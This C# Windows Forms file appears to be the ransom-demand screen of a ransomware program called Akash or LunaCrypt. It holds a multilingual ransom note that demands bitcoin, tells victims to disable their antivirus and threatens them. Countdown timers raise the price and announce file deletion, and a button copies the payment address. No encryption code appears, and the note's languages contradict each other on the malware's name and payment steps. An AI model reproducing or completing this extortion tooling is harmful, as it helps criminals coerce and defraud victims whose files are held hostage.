using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AkashDecryptr
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            boxLang.Items.Add("English");
            boxLang.Items.Add("Finnish");
            boxLang.Items.Add("Russian");
            boxLang.Items.Add("Spanish");
            boxLang.Items.Add("Arabic");
            boxLang.Items.Add("Chinese");
            boxLang.Items.Add("French");

            boxLang.SelectedIndex = 0;
            LoadLanguage("English");
        }

        private void LoadLanguage(string language)
        {

            if (language == "English")
                lblPR.Text = "Decryption price rises in:";
            else if (language == "Finnish")
                lblPR.Text = "Hinta nousee ajassa:";
            else if (language == "Russian")
                lblPR.Text = "повышение цен:";
            else if (language == "Spanish")
                lblPR.Text = "Aumentos de precios:";
            else if (language == "Arabic")
                lblPR.Text = "ارتفاع الأسعار مع مرور الوقت:";
            else if (language == "Chinese")
                lblPR.Text = "价格上涨：";
            else if (language == "French")
                lblPR.Text = "Prix en hausse:";

            if (language == "English")
                lblFL.Text = "Your files will be lost in:";
            else if (language == "Finnish")
                lblFL.Text = "Tiedostot poistuu ajassa:";
            else if (language == "Russian")
                lblFL.Text = "файлы удаляются:";
            else if (language == "Spanish")
                lblFL.Text = "Los archivos se eliminan:";
            else if (language == "Arabic")
                lblFL.Text = "تم حذف الملفات:";
            else if (language == "Chinese")
                lblFL.Text = "文件将被及时删除：";
            else if (language == "French")
                lblFL.Text = "Fichiers sont supprimés:";

            if (language == "English")
                lblMain.Text = "Uh oh, your files got encrypted!";
            else if (language == "Finnish")
                lblMain.Text = "Voi ei, tiedostosi salattiin!";
            else if (language == "Russian")
                lblMain.Text = "О нет, ваши файлы зашифрованы!";
            else if (language == "Spanish")
                lblMain.Text = "¡Oh no, tus archivos están encriptados!";
            else if (language == "Arabic")
                lblMain.Text = "أوه لا، لقد تم تشفير ملفاتك!";
            else if (language == "Chinese")
                lblMain.Text = "哦不，您的文件已加密！";
            else if (language == "French")
                lblMain.Text = "Oh non, vos fichiers sont cryptés!";

            if (language == "English")
                lblDecP.Text = "Decryption price:";
            else if (language == "Finnish")
                lblDecP.Text = "Tiedostojen purkuhinta:";
            else if (language == "Russian")
                lblDecP.Text = "Цена расшифровки:";
            else if (language == "Spanish")
                lblDecP.Text = "Precio de descifrado:";
            else if (language == "Arabic")
                lblDecP.Text = "سعر فك التشفير:";
            else if (language == "Chinese")
                lblDecP.Text = "解密价格：";
            else if (language == "French")
                lblDecP.Text = "Prix du décryptage:";

            if (language == "English")
                lblBA.Text = "Bitcoin address:";
            else if (language == "Finnish")
                lblBA.Text = "Bitcoin osoite:";
            else if (language == "Russian")
                lblBA.Text = "биткойн-адрес:";
            else if (language == "Spanish")
                lblBA.Text = "bitcoin dirección:";
            else if (language == "Arabic")
                lblBA.Text = "عنوان البيتكوين:";
            else if (language == "Chinese")
                lblBA.Text = "比特币地址：";
            else if (language == "French")
                lblBA.Text = "bitcoin adresse:";

            if (language == "English")
                panelLetter.Text = "\r\n==== WHAT JUST HAPPENED? ====\r\n\r\nSome of your important files have been encrypted by the Akash ransomware. The encryption was done with military-grade\r\nencryption. This means that your files will be inaccessible without being decrypted with\r\nthis decryption program. Do not try to find other ways to unlock your files, as they will not work.\r\nThis means that they can only be recovered by paying a fee.\r\n\r\n==== IS IT POSSIBLE TO GET MY FILES BACK? ====\r\n\r\nAbsolutely! But remember that it will cost you. Be quick, as you have six days to unlock your files. \r\nIf your files are not decrypted within that time, they will be gone forever. The decryption price will\r\nincrease to 130 euros three days after the detection date.\r\n\r\n==== IMPORTANT NOTE! ====\r\n\r\nYou can only unlock your files by paying the price! Do not try to rename your files! If possible,\r\ndisable your antivirus program so that it does not remove this decryption software. The timers on the left side\r\nshow how much time you have. This program also has everything you need\r\nto know to unlock your files. Closing this program will not stop these timers.\r\n\r\n=== HOW CAN I UNLOCK MY FILE? ====\r\n\r\nYou can only pay with bitcoins. If you want to unlock your files, you need to go to any\r\ntrusted crypto trading site on the internet. After that, you need to buy bitcoins in the amount mentioned on the left side\r\nand then send them to the bitcoin address below. Then press\r\n\"Check for payment\". Wait up to ten minutes for the decryption program to verify the payment\r\nand decrypt your files. If you doubt the functionality of the program, you can decrypt 4 files of your choice\r\nby pressing \"Decrypt\" and placing the paths of your files in the pop-up window.\r\n\r\n== WHAT IF I DON'T WANT TO PAY OR UNLOCK MY FILES?==\r\n\r\nIf you don't want to pay or unlock your files, the timers won't stop and our files will remain\r\nencrypted forever. We recommend that you decrypt your files as soon as possible.\r\n\r\n==== WHAT DO I DO NEXT? ====\r\n\r\nFirst, reset your router and every infected device. This will prevent a new infection from our malware. \r\nNext time, keep your antivirus up to date and don't execute every file you see.\r\n\r\nDon't try anything stupid, we'll monitor the situation.";
            else if (language == "Finnish")
                panelLetter.Text = "\r\n==== MITÄ JUURI TAPAHTUI? ====\r\n\r\nJotkin tärkeät tiedostosi ovat salattuja Akash-kiristyshaittaohjelman toimesta. Salaus tehtiin sotilastason\r\nsalauksella. Tämä tarkoittaa, että tiedostoihisi ei nää pääse käsiksi ilman, että niitä puretaan \r\nTällä salauksenpurkuohjelmalla. Älä yritä etsiä muita tapoja avata tiedostojasi, koska ne eivät toimi.\r\nTämä tarkoittaa, että ne voidaan palauttaa vain maksun avulla.\r\n\r\n==== ONKO MAHDOLLISTA SAADA TIEDOSTONI TAKAISIN? ====\r\n\r\nEhdottomasti! Mutta muista, että se maksaa. Ole nopea, sillä sinulla on kuusi päivää aikaa avata\r\ntiedostojesi lukitus. Jos tiedostojasi ei pureta tuossa ajassa, ne ovat poissa ikuisesti. Salauksen purkamisen\r\nhinta nousee 130 euroon kolmen päivän kuluttua tunnistuspäivästä.\r\n\r\n==== TÄRKEÄ HUOMAUTUS! ====\r\n\r\nVoit avata tiedostosi vain Maksamalla hinnan! Älä yritä nimetä tiedostojasi uudelleen! Jos mahdollista,\r\npoista virustorjuntaohjelmasi käytöstä, jotta se ei poista tätä salauksenpurkuohjelmistoa. Vasemmalla puolella\r\nolevat ajastimet näyttävät, kuinka paljon aikaa sinulla on. Tässä ohjelmassa on myös kaikki mitä sinun tarvitsee\r\ntietää tiedostojesi lukituksen avaamiseksi. Tämän ohjelman sulkeminen ei pysäytä näitä ajastimia.\r\n\r\n=== MITEN VOIN AVATA TIEDOSTONI? ====\r\n\r\nVoit maksaa vain bitcoineilla. Jos haluat avata tiedostojesi lukituksen, sinun on mentävä mihin tahansa\r\nluotettavaan kryptokaupankäyntisivustoon internetissä. Sen jälkeen sinun on ostettava bitcoineja vasemmalla\r\npuolella mainitun summan arvosta. Lähetä ne sen jälkeen alla olevaan bitcoin-osoitteeseen. Paina sitten\r\n\"Check for payment\". Odota enintään kymmenen minuuttia, jotta purkuohjelma tarkistaa maksun\r\nja purkaa tiedostosi. Jos epäilet ohjelman toimivuutta, voit purkaa 4 omavalintaista tiedostoasi\r\npainamalla \"Decrypt\" ja sijoittamalla ponnahdusikkunaan tiedostojesi polut.\r\n\r\n== MITÄ JOS EN HALUA MAKSAA TAI AVATA TIEDOSTOJANI?==\r\n\r\nJos et halua maksaa tai avata tiedostojesi lukitusta, ajastimet eivät pysähdy ja tiedostomme pysyvät\r\nsalattuina ikuisesti. Suosittelemme, että purat tiedostojesi salauksen mahdollisimman nopeasti.\r\n\r\n==== MITÄ TEEN JÄLKEEN? ====\r\n\r\nEnsinnäkin, nollaa reitittimesi ja jokainen tartunnan saanut laite. Tämä estää uuden tartunnan\r\nhaittaohjelmltamme. Pidä ensi kerralla virustorjuntasi ajan tasalla \r\näläkä suorita kaikkia näkemiäsi tiedostoja.\r\n\r\nÄlä yritä mitään tyhmää, me tarkkailemme tilannetta.";
            else if (language == "Russian")
                panelLetter.Text = "\r\n==== ЧТО ПРОИЗОШЛО? ====\r\n\r\nНекоторые из ваших важных файлов были зашифрованы программой-вымогателем LunaCrypt. Шифрование было выполнено с использованием военного уровня шифрования. Это означает, что ваши файлы больше не будут доступны без их расшифровки вашим личным ключом дешифрования. Не пытайтесь найти другие способы разблокировки файлов, они не сработают.\r\nЭто означает, что их можно восстановить только с помощью ключа.\r\n\r\n==== ВОЗМОЖНО ЛИ ВЕРНУТЬ МОИ ФАЙЛЫ? ====\r\n\r\nКонечно! Но имейте в виду, что это стоит денег.\r\nСпешите, у вас есть шесть дней, чтобы разблокировать свои файлы.\r\nЕсли ваши файлы не будут расшифрованы за это время, они будут\r\nутеряны навсегда. Стоимость расшифровки возрастает до 130 евро\r\nчерез три дня с даты взлома.\r\n\r\n==== ВАЖНОЕ ПРИМЕЧАНИЕ! ====\r\n\r\nВы можете разблокировать файлы только с помощью ключа.\r\nНе пытайтесь переименовывать файлы!\r\nЕсли возможно, отключите антивирус, чтобы он не удалил программу дешифрования. Таймеры слева показывают, сколько у вас осталось времени. Там также есть вся необходимая информация о том, как разблокировать файлы. Выключение компьютера не останавливает таймеры.\r\n\r\n==== КАК РАЗБЛОКИРОВАТЬ ФАЙЛЫ? ====\r\n\r\nВы можете оплатить только биткойнами.\r\nЧтобы разблокировать файлы, вам нужно перейти на любой надежный сайт для торговли криптовалютой в интернете.\r\nПосле этого вам необходимо купить биткойны на ту же сумму, что указана слева. После этого отправьте их на биткойн-адрес ниже. Затем свяжитесь с нами по адресу электронной почты, указанному слева, чтобы получить ваш персональный ключ дешифрования. Не забудьте вставить свой идентификатор в сообщение! Затем введите этот ключ в текстовое поле и нажмите «Расшифровать файлы».\r\n\r\nи дождитесь, пока программа разблокирует ваши файлы.\r\n\r\n== ЧТО, ЕСЛИ Я НЕ ХОЧУ ПЛАТИТЬ ИЛИ РАЗБЛОКИРОВАТЬ СВОИ ФАЙЛЫ?==\r\n\r\nЕсли вы не хотите платить или разблокировать свои файлы, таймеры\r\nне остановятся, и наши файлы останутся зашифрованными навсегда.\r\n\r\nМы настоятельно рекомендуем вам расшифровать ваши файлы как можно скорее.\r\n\r\n=== ЧТО ДЕЛАТЬ ПОСЛЕ ЭТОГО? ====\r\n\r\nПрежде всего, пожалуйста, сбросьте настройки роутера\r\nи всех зараженных устройств. Это предотвратит повторное\r\nзаражение нашим вредоносным ПО. В следующий раз обновляйте\r\nваш антивирус и не запускайте каждый файл, который видите.\r\n\r\nНе пытайтесь делать глупости, мы следим за вами.";
            else if (language == "Spanish")
                panelLetter.Text = "\r\n==== ¿QUÉ ACABA DE PASAR? ====\r\n\r\nAlgunos de tus archivos importantes han sido cifrados por el ransomware LunaCrypt. El cifrado se realizó con un nivel de cifrado militar. Esto significa que ya no podrás acceder a tus archivos sin descifrarlos con tu clave personal. No intentes buscar otras formas de desbloquearlos, ya que no funcionarán. Esto significa que solo se pueden recuperar con la clave.\r\n\r\n==== ¿ES POSIBLE RECUPERAR MIS ARCHIVOS? ====\r\n\r\n¡Por supuesto! Pero ten en cuenta que cuesta dinero.\r\nDate prisa, porque tienes seis días para desbloquear tus archivos.\r\nSi no los descifras en ese tiempo, desaparecerán para siempre. El precio del descifrado asciende a 130 € tres días después de la fecha de inicio.\r\n\r\n==== ¡AVISO IMPORTANTE! ====\r\n\r\nSolo puedes desbloquear tus archivos con la clave. ¡No intentes renombrar tus archivos!\r\nSi es posible, desactiva tu antivirus para que no elimine este software de descifrado. Los temporizadores a la izquierda muestran el tiempo disponible. También encontrarás todo lo que necesitas saber para desbloquear tus archivos. Apagar el ordenador no detiene los temporizadores.\r\n\r\n==== ¿CÓMO PUEDO DESBLOQUEAR MIS ARCHIVOS? ====\r\n\r\nSolo puedes pagar con Bitcoins.\r\nSi quieres desbloquear tus archivos, visita cualquier sitio web confiable de intercambio de criptomonedas.\r\nDespués, compra la misma cantidad de bitcoins que se indica a la izquierda. Después, envíalos a la dirección de Bitcoin que aparece a continuación. Después, contáctanos al correo electrónico que aparece a la izquierda para recibir tu clave de descifrado personal. ¡Recuerda pegar tu ID en el mensaje!\r\nEscribe la clave en el cuadro de texto, haz clic en \"Descifrar archivos\" y espera a que el programa desbloquee tus archivos.\r\n\r\n== ¿QUÉ PASA SI NO QUIERO PAGAR NI DESBLOQUEAR MIS ARCHIVOS?==\r\n\r\nSi no desea pagar ni desbloquear sus archivos, los temporizadores no se detendrán y nuestros archivos permanecerán cifrados para siempre.\r\nLe recomendamos encarecidamente que descifre sus archivos lo antes posible.\r\n\r\n=== ¿QUÉ HAGO DESPUÉS? ====\r\n\r\nAntes que nada, reinicie su router y todos los dispositivos infectados. Esto evita otra infección de nuestro malware. La próxima vez, mantenga su antivirus actualizado y no ejecute todos los archivos que vea.\r\n\r\nNo intente nada estúpido, estamos observando.";
            else if (language == "Arabic")
                panelLetter.Text = "\r\n==== ماذا حدث للتو؟ ====\r\n\r\nتم تشفير بعض ملفاتك المهمة بواسطة برنامج الفدية LunaCrypt. تم التشفير باستخدام تشفير عسكري. هذا يعني أنه لم يعد بإمكانك الوصول إلى ملفاتك دون فك تشفيرها باستخدام مفتاح فك التشفير الخاص بك. لا تحاول البحث عن طرق أخرى لفك تشفير ملفاتك، لأنها لن تنجح. هذا يعني أنه لا يمكن استردادها إلا باستخدام المفتاح.\r\n\r\n=== هل من الممكن استعادة ملفاتي؟ ====\r\n\r\nبالتأكيد! ولكن تذكر أن الأمر مكلف.\r\nسارع، لديك ستة أيام لفك تشفير ملفاتك.\r\nإذا لم يتم فك تشفير ملفاتك خلال تلك الفترة، فستختفي إلى الأبد. يرتفع سعر فك التشفير إلى 130 يورو بعد ثلاثة أيام من تاريخ التشفير.\r\n\r\n=== تنبيه هام! ====\r\n\r\nيمكنك فقط فتح ملفاتك باستخدام المفتاح.\r\n\r\nلا تحاول إعادة تسمية ملفاتك!\r\n\r\nإن أمكن، يُرجى تعطيل برنامج مكافحة الفيروسات لديك، حتى لا يُزيل برنامج فك التشفير هذا. تُظهر المؤقتات على الجانب الأيسر المدة المتاحة لديك. يوجد أيضًا كل ما تحتاج لمعرفته حول كيفية فتح ملفاتك. إيقاف تشغيل جهاز الكمبيوتر لا يُوقف هذه المؤقتات.\r\n\r\n==== كيف يُمكنني فتح ملفاتي؟ ====\r\n\r\nيمكنك الدفع بعملة البيتكوين فقط.\r\n\r\nلفتح ملفاتك، عليك زيارة أي موقع تداول عملات رقمية موثوق على الإنترنت.\r\n\r\nبعد ذلك، يجب عليك شراء نفس المبلغ من البيتكوين المذكور على الجانب الأيسر. بعد ذلك، أرسلها إلى عنوان البيتكوين أدناه. ثم يُرجى التواصل معنا عبر البريد الإلكتروني المذكور على الجانب الأيسر لتلقي مفتاح فك التشفير الخاص بك. تذكر لصق مُعرّفك في الرسالة!\r\nثم اكتب هذا المفتاح في مربع النص وانقر على \"فك تشفير الملفات\" وانتظر حتى يفتح البرنامج ملفاتك.\r\n\r\n== ماذا لو لم أرغب في الدفع أو فتح ملفاتي؟==\r\n\r\nإذا لم ترغب في الدفع أو فتح ملفاتك، فلن تتوقف المؤقتات وستبقى ملفاتنا مشفرة إلى الأبد.\r\n\r\nنوصيك بشدة بفك تشفير ملفاتك في أسرع وقت ممكن.\r\n\r\n=== ماذا أفعل بعد ذلك؟ ====\r\n\r\nأولًا، يُرجى إعادة ضبط جهاز التوجيه (الراوتر) الخاص بك وجميع الأجهزة المصابة. هذا يمنع أي إصابة أخرى من برامجنا الخبيثة. في المرة القادمة، حافظ على تحديث برنامج مكافحة الفيروسات لديك ولا تشغّل كل ملف تراه.\r\n\r\nلا تحاول أي شيء غبي، نحن نراقب.";
            else if (language == "Chinese")
                panelLetter.Text = "\r\n==== 刚刚发生了什么？====\r\n\r\n您的一些重要文件已被 LunaCrypt 勒索软件加密。加密采用军用级加密技术。这意味着，除非使用您的个人解密密钥解密，否则您的文件将无法访问。请勿尝试其他方法来解锁您的文件，因为它们将无法正常工作。\r\n这意味着，只有使用密钥才能恢复它们。\r\n\r\n==== 我能找回我的文件吗？====\r\n\r\n当然可以！但请记住，这需要花钱。\r\n赶快行动，因为您有六天的时间来解锁您的文件。\r\n如果您的文件未在这段时间内解密，它们将永远消失。自感染之日起三天后，解密费用将上涨至 130 欧元。\r\n\r\n==== 重要提示！====\r\n\r\n您只能使用密钥解锁您的文件。请勿尝试重命名您的文件！\r\n如果可能，请禁用您的杀毒软件，这样它就不会\r\n删除此解密软件。左侧的计时器会显示您剩余的时间。此外，还有您需要了解的有关如何解锁文件的所有信息。关闭计算机不会\r\n停止这些计时器。\r\n\r\n==== 如何解锁我的文件？ ====\r\n\r\n您只能使用比特币支付。\r\n如果您想解锁文件，您必须访问互联网上任何值得信赖的加密货币交易网站。\r\n之后，您必须购买与左侧所示金额等值的比特币。之后，将其发送到下方的比特币地址。然后，请通过左侧所示的电子邮件联系我们，以获取您的个人解密密钥。请记住在邮件中粘贴您的 ID！\r\n然后将该密钥写入文本框，点击“解密文件”，\r\n并等待程序解锁您的文件。\r\n\r\n== 如果我不想付款或解锁我的文件怎么办？==\r\n\r\n如果您不想付款或解锁您的文件，计时器将不会停止，我们的文件将永远保持加密状态。\r\n我们强烈建议您尽快解密您的文件。\r\n\r\n==== 之后我该怎么做？====\r\n\r\n首先，请重置您的路由器\r\n和所有受感染的设备。这可以防止我们的恶意软件再次感染。下次，请保持您的杀毒软件\r\n更新，并且不要运行您看到的每个文件。\r\n\r\n不要做任何愚蠢的事情，我们正在监视。";
            else if (language == "French")
                panelLetter.Text = "\r\n==== QUE VIENT-IL DE SE PASSER ? ====\r\n\r\nCertains de vos fichiers importants ont été chiffrés par le rançongiciel LunaCrypt. Le chiffrement a été réalisé avec un chiffrement de niveau militaire. Cela signifie que vos fichiers ne sont plus accessibles sans être déchiffrés avec votre clé de déchiffrement personnelle. N'essayez pas de trouver d'autres moyens de déverrouiller vos fichiers, car ils ne fonctionneront pas.\r\nCela signifie qu'ils ne peuvent être récupérés qu'avec la clé.\r\n\r\n==== EST-IL POSSIBLE DE RÉCUPÉRER MES FICHIERS ? ====\r\n\r\nAbsolument ! Mais n'oubliez pas que cela est payant.\r\nDépêchez-vous, car vous avez six jours pour déverrouiller vos fichiers.\r\nSi vos fichiers ne sont pas déchiffrés dans ce délai, ils seront définitivement perdus. Le prix du déchiffrement passe à 130 € trois jours après la date d'indentification.\r\n\r\n==== IMPORTANT ! ====\r\n\r\nVous ne pouvez déverrouiller vos fichiers qu'avec la clé.\r\nN'essayez pas de renommer vos fichiers ! Si possible, veuillez désactiver votre antivirus afin qu'il ne supprime pas ce logiciel de déchiffrement. Les minuteurs à gauche indiquent le temps dont vous disposez. Vous y trouverez également tout ce dont vous avez besoin pour déverrouiller vos fichiers. Éteindre votre ordinateur n'arrête pas ces minuteurs.\r\n\r\n==== COMMENT DÉVERROUILLER MES FICHIERS ? ====\r\n\r\nVous ne pouvez payer qu'en bitcoins.\r\nPour déverrouiller vos fichiers, rendez-vous sur un site de trading de cryptomonnaies fiable.\r\nEnsuite, achetez la même quantité de bitcoins que celle indiquée à gauche. Envoyez-les ensuite à l'adresse bitcoin ci-dessous. Veuillez ensuite nous contacter à l'adresse e-mail indiquée à gauche pour recevoir votre clé de déchiffrement personnelle. N'oubliez pas de coller votre identifiant dans le message !\r\nSaisissez ensuite cette clé dans la zone de texte, cliquez sur « Décrypter les fichiers » et attendez que le programme déverrouille vos fichiers.\r\n\r\n== QUE FAIRE SI JE NE VEUX PAS PAYER OU DÉVERROUILLER MES FICHIERS ?==\r\n\r\nSi vous ne souhaitez pas payer ou déverrouiller vos fichiers, le délai de déchiffrement\r\nne s'arrêtera pas et vos fichiers resteront chiffrés à jamais.\r\nNous vous recommandons vivement de déchiffrer vos fichiers au plus vite.\r\n\r\n==== QUE FAIRE APRÈS ? ====\r\n\r\nTout d'abord, veuillez réinitialiser votre routeur\r\net chaque appareil infecté. Cela évitera une nouvelle infection par notre logiciel malveillant. La prochaine fois, maintenez votre antivirus à jour et n'exécutez pas tous les fichiers que vous voyez.\r\n\r\nNe tentez rien de stupide, nous vous surveillons.";
        }

        private void picLock_Click(object sender, EventArgs e)
        {
            
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Ransomware");
        }

        private void linkBtc_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void lblMain_Click(object sender, EventArgs e)
        {

        }

        private void boxLang_SelectedIndexChanged(object sender, EventArgs e)
        {
            string selectedLanguage = boxLang.SelectedItem.ToString();
            LoadLanguage(selectedLanguage);
        }

        private void panel4_Paint(object sender, PaintEventArgs e)
        {
            ControlPaint.DrawBorder(
            e.Graphics,
            panel4.ClientRectangle,
            Color.White, ButtonBorderStyle.Solid);
        }

        private void panelTime_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void panelLetter_TextChanged(object sender, EventArgs e)
        {

        }

        DateTime endTimePR;
        DateTime endTimeFL;

        private void timerFL_Tick(object sender, EventArgs e)
        {
            TimeSpan remaining = endTimeFL - DateTime.Now;

            if (remaining.TotalSeconds > 0)
            {
                lblTFL.Text = $"{remaining.Days:D1}:{remaining.Hours:D2}:{remaining.Minutes:D2}:{remaining.Seconds:D2}";
            }
            else
            {
                timerFL.Stop();
                MessageBox.Show("Time's up! Every encrypted file got deleted :(", "Notification", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void timerPR_Tick(object sender, EventArgs e)
        {
            TimeSpan remaining = endTimePR - DateTime.Now;

            if (remaining.TotalSeconds > 0)
            {
                lblTPR.Text = $"{remaining.Days:D1}:{remaining.Hours:D2}:{remaining.Minutes:D2}:{remaining.Seconds:D2}";
            }
            else
            {
                timerPR.Stop();
                MessageBox.Show("Time's up! Price of decryption got raised to 130€", "Notification", MessageBoxButtons.OK, MessageBoxIcon.Information);
                lblPrice.Text = "130€";
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            endTimePR = DateTime.Now.AddDays(3);
            endTimeFL = DateTime.Now.AddDays(6);

            timerPR.Interval = 1000;
            timerPR.Start();

            timerFL.Interval = 1000;
            timerFL.Start();

            boxLang.SelectedIndex = 0;
            LoadLanguage("English");
        }

        private void btnCopy_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.Clipboard.SetText(lblBTC.Text);
            MessageBox.Show("Bitcoin address copied to clipboard!", "Notification", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void linkenc_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
        }
    }
}
